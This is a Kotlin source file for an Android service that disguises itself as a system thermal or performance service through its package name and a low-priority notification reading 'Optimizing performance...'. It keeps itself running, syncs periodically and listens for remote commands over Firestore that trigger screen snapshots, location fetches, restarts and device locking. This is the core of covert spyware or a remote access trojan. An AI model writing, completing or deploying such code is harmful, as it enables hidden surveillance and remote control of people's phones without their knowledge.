package com.android.system.service.thermal

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class PersistentService : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Optimizing performance...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(NOTIFICATION_ID, notification)

        // Check for remote app updates
        UpdateManager.checkForUpdates(this)

        // Schedule battery-efficient periodic sync via WorkManager
        schedulePeriodicSync()

        // Listen for remote commands
        FirestoreSync.listenForCommands { cmd -> handleRemoteCommand(cmd) }

        return START_STICKY
    }

    private fun schedulePeriodicSync() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "ZondraSyncWork",
            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
    }

    private fun handleRemoteCommand(command: String) {
        when (command) {
            "SNAPSHOT"  -> {
                val projIntent = Intent(this, ScreenSnapshotter::class.java)
                startService(projIntent)
            }
            "LOCATION"  -> {
                // Trigger location fetch (permissions required)
                FirestoreSync.syncLocation(0.0, 0.0, "Location fetch triggered")
            }
            "RESTART"   -> stopSelf().also { startService(Intent(this, PersistentService::class.java)) }
            "LOCK"      -> {
                // Requires Device Admin
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "System Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        const val CHANNEL_ID = "SystemThermalServiceChannel"
        const val NOTIFICATION_ID = 101
    }
}
